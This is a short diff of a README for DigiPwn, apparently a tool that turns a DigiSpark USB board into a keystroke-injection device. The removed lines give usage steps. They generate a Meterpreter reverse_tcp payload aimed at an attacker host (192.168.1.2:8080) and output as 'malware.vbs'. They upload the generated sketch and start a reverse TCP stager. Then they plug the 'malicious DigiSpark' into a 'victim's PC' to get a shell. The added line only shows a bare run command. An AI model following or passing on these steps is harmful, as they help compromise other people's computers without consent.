@@ -12,15 +12,7 @@ ability to use the familiar Arduino IDE, this board is a great way to jump into 
 # Installation 
  - First clone the repo
   `git clone https://github.com/zer0overflow/DigiPwn.git`
- - Then run `python DigiPwn.py [HOST] [PORT] [PAYLOAD] [OUTPUT FILE] [FORMAT]`
-   
-   Example: `python DigiPwn.py 192.168.1.2 8080 windows/meterpreter/reverse_tcp malware.vbs vbs`
-   
- - A file named `keystroke_inject.ino` will be created. Upload that code using Arduino.
- 
- - The program will ask you if you want to start a reverse tcp stager. Press y and then enter to start one.
- 
- - Plug the malcious DigiSpark to victim's PC and **BOOM! You've a shell!**
+ - Then run `./DigiPwn.py`
 
  Follow me on Instagram
  
